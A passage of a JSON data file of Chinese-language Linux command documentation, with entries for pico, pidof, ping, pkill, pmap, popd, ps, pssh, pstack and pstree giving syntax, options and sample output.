\n\n```\nphp(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：进入交互模式；\n-c：指定“php.ini”的搜索路径。\n```\n\n### 参数  \n\n文件：要执行的php脚本。\n\n\n"},{"name":"pico","categoryId":1,"data":"pico\n\u003d\u003d\u003d\n\n功能强大全屏幕的文本编辑器\n\n## 补充说明\n\n**pico命令** 是功能强大全屏幕的文本编辑器。pico的操作简单，提供了丰富的快捷键。常用的快捷键如下：\n\n```\nCtrl+G：获得pico的帮助信息；\nCtrl+O：保存文件内容，如果是新文件，需要输入文件名；\nCtrl+R：在当前光标位置插入一个指定的文本文件内容；\nCtrl+Y：向前翻页；\nCtrl+V：向后翻页；\nCtrl+w：对文件进行搜索；\nCtrl+K：剪切当前文件行到粘贴缓冲区；\nCtrl+U：粘贴缓冲区中的内容到当前光标所在位置；\nCtrl+C：显示当前光标位置；\nCtrl+T：调用拼写检查功能，对文档进行拼写检查；\nCtrl+J：段落重排；\nCtrl+X：退出，当文件内容发生改变时，提供是否保存修改。\n```\n\n### 语法  \n\n```\npico(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：开启置换的功能；\n-d：开启删除的功能；\n-e：使用完整的文件名称；\n-f：支持键盘上F1、F2...功能键；\n-g：显示光标；\n-h：在线帮助；\n-j：开启切换的功能；\n-k：预设pico在使用剪下命令时，会把光标所在的列的内容全部删除；\n-m：开启鼠标支持的功能，您可用鼠标点选命令列表；\n-n\u003c间隔秒数\u003e：设置多久检查一次新邮件；\n-o\u003c工作目录\u003e：设置工作目录；\n-q：忽略预设值；\n-r\u003c编辑页宽\u003e：设置编辑文件的页宽；\n-s\u003c拼字检查器\u003e：另外指定拼字检查器；\n-t：启动工具模式；\n-v：启动阅读模式，用户只能观看，无法编辑文件的内容；\n-w：关闭自动换行，通过这个参数可以编辑内容很长的列；\n-x：关闭页面下方的命令列表；\n-z：让pico可被Ctrl+z中断，暂存在后台作业里；\n+\u003c列表编号\u003e：执行pico指令进入编辑模式时，从指定的列数开始编辑。\n```\n\n### 参数  \n\n文件：指定要编辑的文件。\n\n\n"},{"name":"pidof","categoryId":0,"data":"pidof\n\u003d\u003d\u003d\n\n查找指定名称的进程的进程号ID号\n\n## 补充说明\n\n**pidof命令** 用于查找指定名称的进程的进程号id号。\n\n### 语法  \n\n```\npidof(选项)(参数)\n```\n\n### 选项  \n\n```\n-s：仅返回一个进程号；\n-c：仅显示具有相同“root”目录的进程；\n-x：显示由脚本开启的进程；\n-o：指定不显示的进程ID。\n```\n\n### 参数  \n\n进程名称：指定要查找的进程名称。\n\n### 实例  \n\n```\npidof nginx\n13312 5371\n\npidof crond\n1509\n\npidof init\n1\n```\n\n\n"},{"name":"ping","categoryId":9,"data":"ping\n\u003d\u003d\u003d\n\n测试主机之间网络的连通性\n\n## 补充说明\n\n**ping命令** 用来测试主机之间网络的连通性。执行ping指令会使用ICMP传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。\n\n### 语法  \n\n```\nping(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：使用Socket的SO_DEBUG功能；\n-c\u003c完成次数\u003e：设置完成要求回应的次数；\n-f：极限检测；\n-i\u003c间隔秒数\u003e：指定收发信息的间隔时间；\n-I\u003c网络界面\u003e：使用指定的网络界面送出数据包；\n-l\u003c前置载入\u003e：设置在送出要求信息之前，先行发出的数据包；\n-n：只输出数值；\n-p\u003c范本样式\u003e：设置填满数据包的范本样式；\n-q：不显示指令执行过程，开头和结尾的相关信息除外；\n-r：忽略普通的Routing Table，直接将数据包送到远端主机上；\n-R：记录路由过程；\n-s\u003c数据包大小\u003e：设置数据包的大小；\n-t\u003c存活数值\u003e：设置存活数值TTL的大小；\n-v：详细显示指令的执行过程。\n```\n\n### 参数  \n\n目的主机：指定发送ICMP报文的目的主机。\n\n### 实例  \n\n```\n[root@AY1307311912260196fcZ ~]# ping www.jsdig.com\nPING host.1.jsdig.com (100.42.212.8) 56(84) bytes of data.\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq\u003d1 ttl\u003d50 time\u003d177 ms\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq\u003d2 ttl\u003d50 time\u003d178 ms\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq\u003d3 ttl\u003d50 time\u003d174 ms\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq\u003d4 ttl\u003d50 time\u003d177 ms\n...按Ctrl+C结束\n\n--- host.1.jsdig.com ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 2998ms\nrtt min/avg/max/mdev \u003d 174.068/176.916/178.182/1.683 ms\n```\n\n\n"},{"name":"pkill","categoryId":0,"data":"pkill\n\u003d\u003d\u003d\n\n可以按照进程名杀死进程\n\n## 补充说明\n\n**pkill命令** 可以按照进程名杀死进程。pkill和killall应用方法差不多，也是直接杀死运行中的程序；如果您想杀掉单个进程，请用kill来杀掉。\n\n### 语法  \n\n```\npkill(选项)(参数)\n```\n\n### 选项  \n\n```\n-o：仅向找到的最小（起始）进程号发送信号；\n-n：仅向找到的最大（结束）进程号发送信号；\n-P：指定父进程号发送信号；\n-g：指定进程组；\n-t：指定开启进程的终端。\n```\n\n### 参数  \n\n进程名称：指定要查找的进程名称，同时也支持类似grep指令中的匹配模式。\n\n### 实例  \n\n```\npgrep -l gaim\n2979 gaim\n\npkill gaim\n```\n\n也就是说：kill对应的是PID，pkill对应的是command。\n\n\n"},{"name":"pmap","categoryId":0,"data":"pmap\n\u003d\u003d\u003d\n\n报告进程的内存映射关系\n\n## 补充说明\n\n**pmap命令** 用于报告进程的内存映射关系，是Linux调试及运维一个很好的工具。\n\n### 语法  \n\n```\npmap(选项)(参数)\n```\n\n### 选项  \n\n```\n-x：显示扩展格式；\n-d：显示设备格式；\n-q：不显示头尾行；\n-V：显示指定版本。\n```\n\n### 参数  \n\n进程号：指定需要显示内存映射关系的进程号，可以是多个进程号。\n\n### 实例  \n\n```\npidof nginx\n13312 5371\n\npmap -x 5371\n5371:   nginx: worker process                \nAddress           Kbytes     RSS   Dirty Mode   Mapping\n0000000000400000     564     344       0 r-x--  nginx\n000000000068c000      68      68      60 rw---  nginx\n000000000069d000      56      12      12 rw---    [ anon ]\n000000000a0c8000    1812    1684    1684 rw---    [ anon ]\n0000003ac0a00000     112      40       0 r-x--  ld-2.5.so\n0000003ac0c1c000       4       4       4 r----  ld-2.5.so\n0000003ac0c1d000       4       4       4 rw---  ld-2.5.so\n0000003ac0e00000    1340     284       0 r-x--  libc-2.5.so\n0000003ac0f4f000    2044       0       0 -----  libc-2.5.so\n0000003ac114e000      16      16       8 r----  libc-2.5.so\n0000003ac1152000       4       4       4 rw---  libc-2.5.so\n0000003ac1153000      20      20      20 rw---    [ anon ]\n0000003ac1200000       8       4       0 r-x--  libdl-2.5.so\n0000003ac1202000    2048       0       0 -----  libdl-2.5.so\n0000003ac1402000       4       4       4 r----  libdl-2.5.so\n0000003ac1403000       4       4       4 rw---  libdl-2.5.so\n0000003ac1600000      84       0       0 r-x--  libselinux.so.1\n0000003ac1615000    2048       0       0 -----  libselinux.so.1\n0000003ac1815000       8       8       8 rw---  libselinux.so.1\n0000003ac1817000       4       4       4 rw---    [ anon ]\n0000003ac1a00000     236       0       0 r-x--  libsepol.so.1\n0000003ac1a3b000    2048       0       0 -----  libsepol.so.1\n0000003ac1c3b000       4       4       4 rw---  libsepol.so.1\n0000003ac1c3c000      40       0       0 rw---    [ anon ]\n0000003ac1e00000      88      44       0 r-x--  libpthread-2.5.so\n0000003ac1e16000    2048       0       0 -----  libpthread-2.5.so\n0000003ac2016000       4       4       4 r----  libpthread-2.5.so\n0000003ac2017000       4       4       4 rw---  libpthread-2.5.so\n0000003ac2018000      16       4       4 rw---    [ anon ]\n0000003ac2600000      80      52       0 r-x--  libz.so.1.2.3\n0000003ac2614000    2044       0       0 -----  libz.so.1.2.3\n0000003ac2813000       4       4       4 rw---  libz.so.1.2.3\n0000003ac2a00000      36       4       0 r-x--  libcrypt-2.5.so\n0000003ac2a09000    2044       0       0 -----  libcrypt-2.5.so\n0000003ac2c08000       4       4       4 r----  libcrypt-2.5.so\n0000003ac2c09000       4       4       4 rw---  libcrypt-2.5.so\n0000003ac2c0a000     184       0       0 rw---    [ anon ]\n0000003ac3600000       8       0       0 r-x--  libkeyutils-1.2.so\n0000003ac3602000    2044       0       0 -----  libkeyutils-1.2.so\n0000003ac3801000       4       4       4 rw---  libkeyutils-1.2.so\n0000003ac3a00000      68       0       0 r-x--  libresolv-2.5.so\n0000003ac3a11000    2048       0       0 -----  libresolv-2.5.so\n0000003ac3c11000       4       4       4 r----  libresolv-2.5.so\n0000003ac3c12000       4       4       4 rw---  libresolv-2.5.so\n0000003ac3c13000       8       0       0 rw---    [ anon ]\n0000003ac3e00000       8       0       0 r-x--  libcom_err.so.2.1\n0000003ac3e02000    2044       0       0 -----  libcom_err.so.2.1\n0000003ac4001000       4       4       4 rw---  libcom_err.so.2.1\n0000003ac4200000    1204       8       0 r-x--  libcrypto.so.0.9.8e\n0000003ac432d000    2044       0       0 -----  libcrypto.so.0.9.8e\n0000003ac452c000     132      88      12 rw---  libcrypto.so.0.9.8e\n0000003ac454d000      16      12      12 rw---    [ anon ]\n0000003ac4600000     176       0       0 r-x--  libgssapi_krb5.so.2.2\n0000003ac462c000    2048       0       0 -----  libgssapi_krb5.so.2.2\n0000003ac482c000       8       8       8 rw---  libgssapi_krb5.so.2.2\n0000003ac4a00000     144       0       0 r-x--  libk5crypto.so.3.1\n0000003ac4a24000    2044       0       0 -----  libk5crypto.so.3.1\n0000003ac4c23000       8       8       8 rw---  libk5crypto.so.3.1\n0000003ac4e00000      32       0       0 r-x--  libkrb5support.so.0.1\n0000003ac4e08000    2044       0       0 -----  libkrb5support.so.0.1\n0000003ac5007000       4       4       4 rw---  libkrb5support.so.0.1\n0000003ac5200000     580       0       0 r-x--  libkrb5.so.3.3\n0000003ac5291000    2048       0       0 -----  libkrb5.so.3.3\n0000003ac5491000      16      16      12 rw---  libkrb5.so.3.3\n0000003ac5a00000     288       4       0 r-x--  libssl.so.0.9.8e\n0000003ac5a48000    2048       0       0 -----  libssl.so.0.9.8e\n0000003ac5c48000      24      16      12 rw---  libssl.so.0.9.8e\n00002b5751808000       8       8       8 rw---    [ anon ]\n00002b5751810000     108      36       0 r-x--  libpcre.so.1.2.0\n00002b575182b000    2044       0       0 -----  libpcre.so.1.2.0\n00002b5751a2a000       4       4       4 rw---  libpcre.so.1.2.0\n00002b5751a2b000      28      28      28 rw---    [ anon ]\n00002b5751a32000      40      20       0 r-x--  libnss_files-2.5.so\n00002b5751a3c000    2044       0       0 -----  libnss_files-2.5.so\n00002b5751c3b000       4       4       4 r----  libnss_files-2.5.so\n00002b5751c3c000       4       4       4 rw---  libnss_files-2.5.so\n00002b5751c3d000       4       4       4 rw-s-  zero (deleted)\n00002b5751c3e000   20012   20000   20000 rw---    [ anon ]\n00007fffbf2ce000      84      20      20 rw---    [ stack ]\n00007fffbf35e000      12       0       0 r-x--    [ anon ]\nffffffffff600000    8192       0       0 -----    [ anon ]\n----------------  ------  ------  ------\ntotal kB           72880   22940   22000\n```\n\n\n"},{"name":"popd","categoryId":0,"data":"popd\n\u003d\u003d\u003d\n\n用于删除目录栈中的记录\n\n## 补充说明\n\n**popd命令** 用于删除目录栈中的记录；如果popd命令不加任何参数，则会先删除目录栈最上面的记录，然后切换到删除过后的目录栈中的最上面的目录。\n\n### 语法  \n\n```\npushd(选项)(参数)\n```\n\n### 选项  \n\n```\n+N：将第N个目录删除（从左边数起，数字从0开始）；\n-N：将第N个目录删除（从右边数起，数字从0开始）；\n-n：将目录出栈时，不切换目录。\n```\n\n### 实例  \n\n```\nroot@Mylinux:/tmp/dir4# popd（相当于popd +0）\n/tmp/dir3 /tmp/dir2 /tmp/dir1 ~\n\nroot@Mylinux:/tmp/dir3# pushd /tmp/dir4\n/tmp/dir4 /tmp/dir3 /tmp/dir2 /tmp/dir1 ~\n\nroot@Mylinux:/tmp/dir4# popd +1\n/tmp/dir4 /tmp/dir2 /tmp/dir1 ~\n\nroot@Mylinux:/tmp/dir4# popd -2\n/tmp/dir4 /tmp/dir1 ~\n```\n\n\n"},{"name":"ppp-off","categoryId":9,"data":"ppp-off\n\u003d\u003d\u003d\n\n关闭ppp连线\n\n## 补充说明\n\n这是Slackware发行版内附的程序，让用户切断PPP的网络连线。\n\n### 语法  \n\n```\nppp-off\n```\n\n\n"},{"name":"pr","categoryId":0,"data":"pr\n\u003d\u003d\u003d\n\n将文本文件转换成适合打印的格式\n\n## 补充说明\n\n**pr命令** 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。\n\n### 语法  \n\n```\npr(选项)(参数)\n```\n\n### 选项  \n\n```\n-h\u003c标题\u003e：为页指定标题；\n-l\u003c行数\u003e：指定每页的行数。\n```\n\n### 参数  \n\n文件：需要转换格式的文件。\n\n\n"},{"name":"printf","categoryId":0,"data":"printf\n\u003d\u003d\u003d\n\n格式化并输出结果\n\n## 补充说明\n\n**printf命令** 格式化并输出结果到标准输出。\n\n### 语法  \n\n```\nprintf(选项)(参数)\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n*   输出格式：指定数据输出时的格式；\n*   输出字符串：指定要输出的数据。\n\n **格式替代符** \n\n*   %b 相对应的参数被视为含有要被处理的转义序列之字符串。\n*   %c ASCII字符。显示相对应参数的第一个字符\n*   %d, %i 十进制整数\n*   %e, %E, %f 浮点格式\n*   %g %e或%f转换，看哪一个较短，则删除结尾的零\n*   %G %E或%f转换，看哪一个较短，则删除结尾的零\n*   %o 不带正负号的八进制值\n*   %s 字符串\n*   %u 不带正负号的十进制值\n*   %x 不带正负号的十六进制值，使用a至f表示10至15\n*   %X 不带正负号的十六进制值，使用A至F表示10至15\n*   %% 字面意义的%\n\n **转义序列** \n\n*   \\a 警告字符，通常为ASCII的BEL字符\n*   \\b 后退\n*   \\c 抑制（不显示）输出结果中任何结尾的换行字符（只在%b格式指示符控制下的参数字符串中有效），而且，任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符，都被忽略\n*   \\f 换页（formfeed）\n*   \\n 换行\n*   \\r 回车（Carriage return）\n*   \\t 水平制表符\n*   \\v 垂直制表符\n*   \\\\ 一个字面上的反斜杠字符\n*   \\ddd 表示1到3位数八进制值的字符，仅在格式字符串中有效\n*   \\0ddd 表示1到3位的八进制值字符\n\n### 实例  \n\n```\nprintf \"hello world\"\n\n```\n\n```\n#!/bin/bash\n\nprintf \"%-5s %-10s %-4s\\n\" NO Name Mark\nprintf \"%-5s %-10s %-4.2f\\n\" 01 Tom 90.3456\nprintf \"%-5s %-10s %-4.2f\\n\" 02 Jack 89.2345\nprintf \"%-5s %-10s %-4.2f\\n\" 03 Jeff 98.4323\n\n```\n\n*   %-5s 格式为左对齐且宽度为5的字符串代替（-表示左对齐），不使用则是又对齐。\n*   %-4.2f 格式为左对齐宽度为4，保留两位小数。\n\n\n"},{"name":"protoize","categoryId":0,"data":"protoize\n\u003d\u003d\u003d\n\nGNU-C代码转换为ANSI-C代码\n\n## 补充说明\n\n**protoize命令** 属于gcc套件，用于为C语言源代码文件添加函数原型，将GNU-C代码转换为ANSI-C代码。\n\n### 语法  \n\n```\nprotoize(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：设置需要转换代码的目录；\n-x：转换代码时排除的文件。\n```\n\n### 参数  \n\n文件：需要转换代码的C语言源文件。\n\n\n"},{"name":"ps","categoryId":2,"data":"ps\n\u003d\u003d\u003d\n\n报告当前系统的进程状态\n\n## 补充说明\n\n**ps命令** 用于报告当前系统的进程状态。可以搭配kill指令随时中断、删除不必要的程序。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。\n\n### 语法  \n\n```\nps(选项)\n```\n\n### 选项  \n\n```\n-a：显示所有终端机下执行的程序，除了阶段作业领导者之外。\na：显示现行终端机下的所有程序，包括其他用户的程序。\n-A：显示所有程序。\n-c：显示CLS和PRI栏位。\nc：列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。\n-C\u003c指令名称\u003e：指定执行指令的名称，并列出该指令的程序的状况。\n-d：显示所有程序，但不包括阶段作业领导者的程序。\n-e：此选项的效果和指定\"A\"选项相同。\ne：列出程序时，显示每个程序所使用的环境变量。\n-f：显示UID,PPIP,C与STIME栏位。\nf：用ASCII字符显示树状结构，表达程序间的相互关系。\n-g\u003c群组名称\u003e：此选项的效果和指定\"-G\"选项相同，当亦能使用阶段作业领导者的名称来指定。\ng：显示现行终端机下的所有程序，包括群组领导者的程序。\n-G\u003c群组识别码\u003e：列出属于该群组的程序的状况，也可使用群组名称来指定。\nh：不显示标题列。\n-H：显示树状结构，表示程序间的相互关系。\n-j或j：采用工作控制的格式显示程序状况。\n-l或l：采用详细的格式来显示程序状况。\nL：列出栏位的相关信息。\n-m或m：显示所有的执行绪。\nn：以数字来表示USER和WCHAN栏位。\n-N：显示所有的程序，除了执行ps指令终端机下的程序之外。\n-p\u003c程序识别码\u003e：指定程序识别码，并列出该程序的状况。\np\u003c程序识别码\u003e：此选项的效果和指定\"-p\"选项相同，只在列表格式方面稍有差异。\nr：只列出现行终端机正在执行中的程序。\n-s\u003c阶段作业\u003e：指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。\ns：采用程序信号的格式显示程序状况。\nS：列出程序时，包括已中断的子程序资料。\n-t\u003c终端机编号\u003e：指定终端机编号，并列出属于该终端机的程序的状况。\nt\u003c终端机编号\u003e：此选项的效果和指定\"-t\"选项相同，只在列表格式方面稍有差异。\n-T：显示现行终端机下的所有程序。\n-u\u003c用户识别码\u003e：此选项的效果和指定\"-U\"选项相同。\nu：以用户为主的格式来显示程序状况。\n-U\u003c用户识别码\u003e：列出属于该用户的程序的状况，也可使用用户名称来指定。\nU\u003c用户名称\u003e：列出属于该用户的程序的状况。\nv：采用虚拟内存的格式显示程序状况。\n-V或V：显示版本信息。\n-w或w：采用宽阔的格式来显示程序状况。　\nx：显示所有程序，不以终端机来区分。\nX：采用旧式的Linux i386登陆格式显示程序状况。\n-y：配合选项\"-l\"使用时，不显示F(flag)栏位，并以RSS栏位取代ADDR栏位　。\n-\u003c程序识别码\u003e：此选项的效果和指定\"p\"选项相同。\n--cols\u003c每列字符数\u003e：设置每列的最大字符数。\n--columns\u003c每列字符数\u003e：此选项的效果和指定\"--cols\"选项相同。\n--cumulative：此选项的效果和指定\"S\"选项相同。\n--deselect：此选项的效果和指定\"-N\"选项相同。\n--forest：此选项的效果和指定\"f\"选项相同。\n--headers：重复显示标题列。\n--help：在线帮助。\n--info：显示排错信息。\n--lines\u003c显示列数\u003e：设置显示画面的列数。\n--no-headers：此选项的效果和指定\"h\"选项相同，只在列表格式方面稍有差异。\n--group\u003c群组名称\u003e：此选项的效果和指定\"-G\"选项相同。\n--Group\u003c群组识别码\u003e：此选项的效果和指定\"-G\"选项相同。\n--pid\u003c程序识别码\u003e：此选项的效果和指定\"-p\"选项相同。\n--rows\u003c显示列数\u003e：此选项的效果和指定\"--lines\"选项相同。\n--sid\u003c阶段作业\u003e：此选项的效果和指定\"-s\"选项相同。\n--tty\u003c终端机编号\u003e：此选项的效果和指定\"-t\"选项相同。\n--user\u003c用户名称\u003e：此选项的效果和指定\"-U\"选项相同。\n--User\u003c用户识别码\u003e：此选项的效果和指定\"-U\"选项相同。\n--version：此选项的效果和指定\"-V\"选项相同。\n--widty\u003c每列字符数\u003e：此选项的效果和指定\"-cols\"选项相同。\n```\n\n由于ps命令能够支持的系统类型相当的多，所以选项多的离谱！\n\n\n"},{"name":"pssh","categoryId":0,"data":"pssh\n\u003d\u003d\u003d\n\n批量管理执行\n\n## 补充说明\n\n**pssh命令** 是一个python编写可以在多台服务器上执行命令的工具，同时支持拷贝文件，是同类工具中很出色的，类似pdsh，个人认为相对pdsh更为简便，使用必须在各个服务器上配置好密钥认证访问。\n\n### 安装pssh  \n\n在CentOS系统环境下，介绍yum的安装和源码安装的方式：\n\n **yum方法** \n\n```\nyum install pssh\n```\n\n **编译安装** \n\n```\nwget http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz\ntar xf pssh-2.3.1.tar.gz\ncd pssh-2.3.1/\npython setup.py install\n```\n\n### 选项  \n\n```\n--version：查看版本\n--help：查看帮助，即此信息\n-h：主机文件列表，内容格式”[user@]host[:port]”\n-H：主机字符串，内容格式”[user@]host[:port]”\n-：登录使用的用户名\n-p：并发的线程数【可选】\n-o：输出的文件目录【可选】\n-e：错误输入文件【可选】\n-t：TIMEOUT 超时时间设置，0无限制【可选】\n-O：SSH的选项\n-v：详细模式\n-A：手动输入密码模式\n-x：额外的命令行参数使用空白符号，引号，反斜线处理\n-X：额外的命令行参数，单个参数模式，同-x\n-i：每个服务器内部处理信息输出\n-P：打印出服务器返回信息\n```\n\n### 实例  \n\n获取每台服务器的uptime：\n\n```\n# pssh -h ip.txt -i uptime\n[1] 11:15:03 [SUCCESS] Mar.mars.he\n11:15:11 up 4 days, 16:25,  1 user,  load average: 0.00, 0.00, 0.00\n[2] 11:15:03 [SUCCESS] Jan.mars.he\n11:15:12 up 3 days, 23:26,  0 users,  load average: 0.00, 0.00, 0.00\n[3] 11:15:03 [SUCCESS] Feb.mars.he\n11:15:12 up 4 days, 16:26,  2 users,  load average: 0.08, 0.02, 0.01\n```\n\n查看每台服务器上mysql复制IO/SQL线程运行状态信息：\n\n```\n# pssh -h IP.txt -i \"/usr/local/mysql/bin/mysql -e \u0027show slave status \\G\u0027\"|grep Running:\n             Slave_IO_Running: yes\n            Slave_SQL_Running: Yes\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n```\n\n保存每台服务器运行的结果：\n\n```\n# pssh -h IP.txt -i -o /tmp/pssh/ uptime\n[1] 11:19:47 [SUCCESS] Feb.mars.he\n11:19:55 up 4 days, 16:31,  2 users,  load average: 0.02, 0.03, 0.00\n[2] 11:19:47 [SUCCESS] Jan.mars.he\n11:19:56 up 3 days, 23:30,  0 users,  load average: 0.01, 0.00, 0.00\n[3] 11:19:47 [SUCCESS] Mar.mars.he\n11:19:56 up 4 days, 16:30,  1 user,  load average: 0.00, 0.00, 0.00\n```\n\n我们来看一下/tmp/pssh/下的文件及其内容\n\n```\n# ll /tmp/pssh/\n总用量 12\n-rw-r--r--. 1 root root 70 12月  1 11:19 Feb.mars.he\n-rw-r--r--. 1 root root 70 12月  1 11:19 Jan.mars.he\n-rw-r--r--. 1 root root 69 12月  1 11:19 Mar.mars.he\n\n# cat /tmp/pssh/*\n11:19:55 up 4 days, 16:31,  2 users,  load average: 0.02, 0.03, 0.00\n11:19:56 up 3 days, 23:30,  0 users,  load average: 0.01, 0.00, 0.00\n11:19:56 up 4 days, 16:30,  1 user,  load average: 0.00, 0.00, 0.00\n```\n\n上面介绍的是pssh命令很少的一部分，大家可以将其用到适合自己的场景，发挥它的最大功效。\n\n\n"},{"name":"pstack","categoryId":0,"data":"pstack\n\u003d\u003d\u003d\n\n显示每个进程的栈跟踪\n\n## 补充说明\n\n**pstack命令** 可显示每个进程的栈跟踪。\u003ckbd\u003epstack\u003c/kbd\u003e 命令必须由相应进程的属主或 \u003ctt\u003eroot\u003c/tt\u003e 运行。可以使用 \u003ckbd\u003epstack\u003c/kbd\u003e 来确定进程挂起的位置。此命令允许使用的唯一选项是要检查的进程的 \u003ctt\u003ePID\u003c/tt\u003e。\n\n命令软件包下载地址：https://packages.debian.org/sid/pstack\n\n### 实例  \n\npstree以树结构显示进程\n\n```\npstree -p work | grep ad\nsshd(22669)---bash(22670)---ad_preprocess(4551)-+-{ad_preprocess}(4552)\n                                                |-{ad_preprocess}(4553)\n                                                |-{ad_preprocess}(4554)\n                                                |-{ad_preprocess}(4555)\n                                                |-{ad_preprocess}(4556)\n                                                `-{ad_preprocess}(4557)\n```\n\nwork为工作用户，-p为显示进程识别码，ad_preprocess共启动了6个子线程，加上主线程共7个线程。\n\n```\nps -Lf 4551\nUID        PID  PPID   LWP  C NLWP STIME TTY      stat   time CMD\nwork      4551 22670  4551  2    7 16:30 pts/2    Sl+    0:02 ./ad_preprocess\nwork      4551 22670  4552  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4553  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4554  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4555  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4556  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\nwork      4551 22670  4557  0    7 16:30 pts/2    Sl+    0:00 ./ad_preprocess\n```\n\n进程共启动了7个线程\n\npstack显示每个进程的栈跟踪：\n\n```\npstack 4551\nThread 7 (Thread 1084229984 (LWP 4552)):\n#0  0x000000302afc63dc in epoll_wait () from /lib64/tls/libc.so.6\n#1  0x00000000006f0730 in ub::EPollEx::poll ()\n#2  0x00000000006f172a in ub::NetReactor::callback ()\n#3  0x00000000006fbbbb in ub::UBTask::CALLBACK ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 6 (Thread 1094719840 (LWP 4553)):\n#0  0x000000302afc63dc in epoll_wait () from /lib64/tls/libc.so.6\n#1  0x00000000006f0730 in ub::EPollEx::poll ()\n#2  0x00000000006f172a in ub::NetReactor::callback ()\n#3  0x00000000006fbbbb in ub::UBTask::CALLBACK ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 5 (Thread 1105209696 (LWP 4554)):\n#0  0x000000302b80baa5 in __nanosleep_nocancel ()\n#1  0x000000000079e758 in comcm::ms_sleep ()\n#2  0x00000000006c8581 in ub::UbClientManager::healthyCheck ()\n#3  0x00000000006c8471 in ub::UbClientManager::start_healthy_check ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 4 (Thread 1115699552 (LWP 4555)):\n#0  0x000000302b80baa5 in __nanosleep_nocancel ()\n#1  0x0000000000482b0e in armor::armor_check_thread ()\n#2  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#3  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#4  0x0000000000000000 in ?? ()\nThread 3 (Thread 1126189408 (LWP 4556)):\n#0  0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6\n#1  0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6\n#2  0x000000000044c972 in Business_config_manager::run ()\n#3  0x0000000000457b83 in Thread::run_thread ()\n#4  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#5  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#6  0x0000000000000000 in ?? ()\nThread 2 (Thread 1136679264 (LWP 4557)):\n#0  0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6\n#1  0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6\n#2  0x00000000004524bb in Process_thread::sleep_period ()\n#3  0x0000000000452641 in Process_thread::run ()\n#4  0x0000000000457b83 in Thread::run_thread ()\n#5  0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0\n#6  0x000000302afc6003 in clone () from /lib64/tls/libc.so.6\n#7  0x0000000000000000 in ?? ()\nThread 1 (Thread 182894129792 (LWP 4551)):\n#0  0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6\n#1  0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6\n#2  0x0000000000420d79 in Ad_preprocess::run ()\n#3  0x0000000000450ad0 in main ()\n```\n\n\n"},{"name":"pstree","categoryId":2,"data":"pstree\n\u003d\u003d\u003d\n\n以树状图的方式展现进程之间的派生关系\n\n## 补充说明\n\n**pstree命令** 以树状图的方式展现进程之间的派生关系，显示效果比较直观。\n\n### 语法  \n\n```\npstree(选项)\n```\n\n### 选项  \n\n```\n-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示；\n-c：不使用精简标示法；\n-G：使用VT100终端机的列绘图字符；\n-h：列出树状图时，特别标明现在执行的程序；\n-H\u003c程序识别码\u003e：此参数的效果和指定\"-h\"参数类似，但特别标明指定的程序；\n-l：采用长列格式显示树状图；\n-n：用程序识别码排序。预设是以程序名称来排序；\n-p：显示程序识别码；\n-u：显示用户名称；\n-U：使用UTF-8列绘图字符；\n-V：显示版本信息。\n```\n\n### 实例  \n\n显示当前所有进程的进程号和进程id\n\n```\npstree -p\n```\n\n显示所有进程的所有详细信息，遇到相同的进程名可以压缩显示。\n\n```\npstree  -a\n```\n\n\n"},{"name":"pushd","categoryId":0,"data":"pushd\n\u003d\u003d\u003d\n\n将目录加入命令堆叠中\n\n## 补充说明\n\n**pushd命令** 是将目录加入命令堆叠中。如果指令没有指定目录名称，则会将当前的工作目录置入目录堆叠的最顶端。置入目录如果没有指定堆叠的位置，也会置入目录堆叠的最顶端，同时工作目录会自动切换到目录堆叠最顶端的目录去。\n\n### 语法  \n\n```\npushd(选项)(参数)\n```\n\n### 选项  